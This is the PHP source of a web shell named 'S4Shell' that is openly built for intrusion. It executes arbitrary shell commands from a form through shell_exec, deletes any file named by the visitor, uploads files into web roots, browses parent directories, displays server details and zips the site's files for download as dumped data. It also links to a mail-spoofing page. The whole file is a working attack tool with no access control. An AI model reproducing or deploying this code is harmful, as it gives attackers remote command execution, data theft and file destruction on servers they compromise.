<?php 
error_reporting(0);
echo "<font color='00FF00' face='Arial'>";
echo "<title>S4Shell</title>";

echo "<center><h1><font face='Arial'>S4Shell</font></h1></center>";
/// delete file with unlink('test.html');
echo "<h2>TOOLS:</h2>";
echo "ZIP + DUMP = DOWNLOAD";
echo "<form method='post' action='".$_SERVER['PHP_SELF']."' >
<input type='submit' value='DUMP DATA' name='dumpit'>
YOU CAN FIND UR DUMPED DATA ON THE FILE LIST BELOW M8

</form>";
echo "DELETE FILE:";
if(!isset($_POST['del'])){
	
echo "<form action='".$_SERVER['PHP_SELF']."' method='post'>
      
	  <input type='text' name='del' value='file name' >          <input type='submit' name='delete' value='DELETE'>
</form>";
	
	
	
}
else{
	echo "<font color='00FF00'>";
	$file=$_POST['del'];
	unlink($file);
	
	
	
	
	
}

echo "UPLOAD:";
if(!isset($_POST['invia'])) {

echo "<form action='".$_SERVER['PHP_SELF']."' enctype='multipart/form-data' method='post'>
      <input type='file' name='file_caricato'>
      <input type='submit' value='Upload' name='invia'>
	  <input type='radio' name='tipo' value='curdir'><font color='00FF00'>Current Directory
	  <input type='radio' name='tipo' value='Cwww'><font color='00FF00'>C:\www
	  <input type='radio' name='tipo' value='C'>/var/www/
	  <input type='radio' name='tipo' value='prev'>Previous Directory
</form>";




}
else 
{

$mode=$_POST['tipo'];
$f=$_FILES['file_caricato']['type'];
$nome=$_FILES['file_caricato']['name'];
$nome_tmp=$_FILES['file_caricato']['tmp_name'];
echo "<font color='00FF00'>f : $f <BR> nome: $nome <BR> tmp: $nome_tmp";


if($mode=="curdir"){
move_uploaded_file($nome_tmp,$nome);
}

if($mode=="Cwww"){
move_uploaded_file($nome_tmp,"C:/www/$nome");
}
if($mode=="prev"){
move_uploaded_file($nome_tmp,"./..");
}
else {
	move_uploaded_file($nome_tmp,"/var/www/$nome");
}

}

echo "<br><br>EXEC SHELL CMD ON WEBSERVER:<br><br>";
echo "<form action='".$_SERVER['PHP_SELF']."' method='post'>
<input type='text' name='cmd' value='Insert command here'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<input type='submit' name='cmd2' value='EXEC'></form>";

echo "<br> MAIL SPOOF(you must upload mailspoof.php first): <a  target='_blank' href='mailspoof.php'> click HERE</a>";
	

echo "<br><h2><center>INFO ABOUT THE SERVER</h2></center><br>KNOWN AS <font color='yellow'><a href='http://".$_SERVER['SERVER_ADDR']."' target='_blank'>".$_SERVER['SERVER_ADDR']."</a></font>  A.K.A. <a href='http://".$_SERVER['SERVER_ADDR']."' target='_blank'>".$_SERVER['SERVER_NAME']."</a><br>PROTOCOL: ".$_SERVER['SERVER_PROTOCOL']."<br>ROOT:".$_SERVER['DOCUMENT_ROOT']."<br>SERVER ADMIN : ".$_SERVER['SERVER_ADMIN']."<br> GATEWAY: ".$_SERVER['GATEWAY_INTERFACE']."<br>SCRIPT NAME:".$_SERVER['SCRIPT_NAME']."<br> SOFTWARE: ".$_SERVER['SERVER_SOFTWARE']."<br> SIGNATURE: ".$_SERVER['SERVER_SIGNATURE'];
// $df contains the number of bytes available on "/"
$df = disk_free_space("/");

// On Windows:
$_c = disk_free_space("C:");
$_d = disk_free_space("D:");
echo "<br>FREE SPACE: (IF WINDOWS: C:\ $_C  D\:? $_d )   (IF LINUX OR MAYBE WIN) $df";
echo "<br>DATE/TIME: ".date('Y-m-d H:i:s');



if(isset($_POST['cmd'])){
$cmd=$_POST['cmd'];

	echo $cmd;
$output = shell_exec("$cmd");
echo "<pre>$output</pre>";
}




//// SHOW FILEs
echo"
<table>
<tr>
<td>";
echo "<body bgcolor='black'>";
echo "<br><br><br><br><br>";
echo "<font color='00FF00'><h2>Current Directory</h2></font>";
if ($handle = opendir('./'.$char)) {

    while (false !== ($entry = readdir($handle))) {

        if ($entry != "." && $entry != "..") {

            echo "<a href='$entry' color='00FF00'>$entry</a><br>";
        }
    }

    closedir($handle);
}
echo "<td>";

echo "<body bgcolor='black'";
echo "<center><font color='00FF00'><h2>Previous Directory</h2></font></center>";
if ($handle = opendir('./../'.$char)) {

    while (false !== ($entry = readdir($handle))) {

        if ($entry != "." && $entry != "..") {

            echo "<a href='./../$entry' color='00FF00'>$entry</a><br>";
        }
    }

    closedir($handle);
}

echo "<td>";

echo "<body bgcolor='black'";
echo "<center><font color='00FF00'><h2>./../../ Directory</h2></font></center>";
if ($handle = opendir('./../../'.$char)) {

    while (false !== ($entry = readdir($handle))) {

        if ($entry != "." && $entry != "..") {

            echo "<a href='./../../$entry' color='00FF00'>$entry</a><br>";
        }
    }

    closedir($handle);
}

echo "<td>";

echo "<body bgcolor='black'";
echo "<center><font color='00FF00'><h2>./../../../ Directory</h2></font></center>";
if ($handle = opendir('./../../../'.$char)) {

    while (false !== ($entry = readdir($handle))) {

        if ($entry != "." && $entry != "..") {

            echo "<a href='./../../../$entry' color='00FF00'>$entry</a><br>";
        }
    }

    closedir($handle);
}



if(isset($_POST['dumpit'])){ // test from stackexchange
$the_folder = '.';
$zip_file_name = '__DUMPED_DATA_HERE.zip';


$download_file= true;
//$delete_file_after_download= true; doesnt work!!


class FlxZipArchive extends ZipArchive {
    /** Add a Dir with Files and Subdirs to the archive;;;;; @param string $location Real Location;;;;  @param string $name Name in Archive;;; @author Nicolas Heimann;;;; @access private  **/

    public function addDir($location, $name) {
        $this->addEmptyDir($name);

        $this->addDirDo($location, $name);
     } // EO addDir;

    /**  Add Files & Dirs to archive;;;; @param string $location Real Location;  @param string $name Name in Archive;;;;;; @author Nicolas Heimann
     * @access private   **/
    private function addDirDo($location, $name) {
        $name .= '/';
        $location .= '/';

        // Read all Files in Dir
        $dir = opendir ($location);
        while ($file = readdir($dir))
        {
            if ($file == '.' || $file == '..') continue;
            // Rekursiv, If dir: FlxZipArchive::addDir(), else ::File();
            $do = (filetype( $location . $file) == 'dir') ? 'addDir' : 'addFile';
            $this->$do($location . $file, $name . $file);
        }
    } // EO addDirDo();
}

$za = new FlxZipArchive;
$res = $za->open($zip_file_name, ZipArchive::CREATE);
if($res === TRUE) 
{
    $za->addDir($the_folder, basename($the_folder));
    $za->close();
}
else  { echo 'Could not create a zip archive';}

if ($download_file)
{
    ob_get_clean();
    header("Pragma: public");
    header("Expires: 0");
    header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
    header("Cache-Control: private", false);
    header("Content-Type: application/zip");
    header("Content-Disposition: attachment; filename=" . basename($zip_file_name) . ";" );
    header("Content-Transfer-Encoding: binary");
    header("Content-Length: " . filesize($zip_file_name));
    readfile($zip_file_name);

}
}

?>
